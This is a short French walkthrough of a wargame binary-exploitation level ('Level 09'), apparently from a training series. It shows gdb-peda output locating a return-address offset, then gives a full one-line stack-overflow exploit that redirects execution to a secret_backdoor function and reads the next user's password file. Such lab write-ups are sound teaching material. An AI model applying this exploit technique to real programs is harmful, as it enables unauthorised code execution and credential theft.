# Level 09

- On peut overflow la deuxieme entrée
- On calcule donc l'offset pour pouvoir ecrire par dessus la Return Address
- La longueur de se qui sera copier est controlé par l'un des caractere de l'username donc on y met que la plus grande valeur \xff
<pre>
gdb-peda$ pattern create 300
'AAA%AAsAABAA$AAnAACAA-AA(AADA...'
gdb-peda$ r < <(python -c "print('\xff' * 120)"; echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA...')
[----------------------------------registers-----------------------------------]
RBP: 0x417941417841415a ('ZAAxAAyA')
<strong>RSP: 0x7fffffffe4b8 ("AzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%")</strong>
RIP: 0x555555554931 (<handle_msg+113>:  ret)
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554924 <handle_msg+100>:     lea    rdi,[rip+0x295]        # 0x555555554bc0
   0x55555555492b <handle_msg+107>:     call   0x555555554730 <puts@plt>
   0x555555554930 <handle_msg+112>:     leave  
=> 0x555555554931 <handle_msg+113>:     ret    
   0x555555554932 <set_msg>:    push   rbp
   0x555555554933 <set_msg+1>:  mov    rbp,rsp
   0x555555554936 <set_msg+4>:  sub    rsp,0x410
   0x55555555493d <set_msg+11>: mov    QWORD PTR [rbp-0x408],rdi
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000555555554931 in handle\_msg ()
gdb-peda$ pattern offset AzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%
<strong>AzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A% found at offset: 200</strong>
</pre>
- On recupere l'addresse de la fonction secret_backdoor qui contien l'execution d'un "shell"
<pre>
(gdb) disass secret_backdoor 
Dump of assembler code for function secret_backdoor:
   0x000055555555488c <+0>:     push   %rbp
</pre>
- Il ne reste plus qu'a executé la commande qui va rediriger vers secret_backdoor
```
(python -c "print('\xff' * 120)"; python -c "import struct; print('A' * 200 + struct.pack('<q', 0x55555555488c))"; echo 'cat /home/users/end/.pass' ) | ./level09
```
